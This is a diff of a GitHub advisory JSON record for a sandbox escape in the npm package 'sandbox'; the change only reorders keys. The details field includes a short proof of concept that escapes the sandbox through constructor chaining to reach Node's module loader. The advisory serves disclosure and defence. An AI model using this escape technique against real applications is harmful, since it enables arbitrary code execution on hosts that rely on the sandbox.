@@ -1,16 +1,37 @@
 {
-  "id": "GHSA-fm4j-4xhm-xpwx",
-  "summary": "Sandbox Breakout / Arbitrary Code Execution in sandbox",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-fm4j-4xhm-xpwx/GHSA-fm4j-4xhm-xpwx.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "sandbox",
+        "purl": "pkg:npm/sandbox"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0.0.0"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [],
+    "github_reviewed": true,
+    "github_reviewed_at": "2020-08-31T18:34:58Z",
+    "nvd_published_at": null,
+    "severity": "MODERATE"
+  },
   "details": "All versions of `sandbox` are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.\n\n## Proof of concept\n```\nvar Sandbox = require(\"sandbox\")\ns = new Sandbox()\ncode = `new Function(\"return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())\")()(\"util\").inspect(\"hi\")`\ns.run(code)\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
+  "id": "GHSA-fm4j-4xhm-xpwx",
   "modified": "2020-08-31T18:34:58Z",
   "published": "2020-09-02T15:51:34Z",
-  "database_specific": {
-    "nvd_published_at": null,
-    "cwe_ids": [],
-    "severity": "MODERATE",
-    "github_reviewed": true,
-    "github_reviewed_at": "2020-08-31T18:34:58Z"
-  },
   "references": [
     {
       "type": "WEB",
@@ -21,27 +42,6 @@
       "url": "https://www.npmjs.com/advisories/766"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "sandbox",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/sandbox"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0.0.0"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-fm4j-4xhm-xpwx/GHSA-fm4j-4xhm-xpwx.json"
-      }
-    }
-  ],
-  "schema_version": "1.6.0"
+  "schema_version": "1.6.0",
+  "summary": "Sandbox Breakout / Arbitrary Code Execution in sandbox"
 }
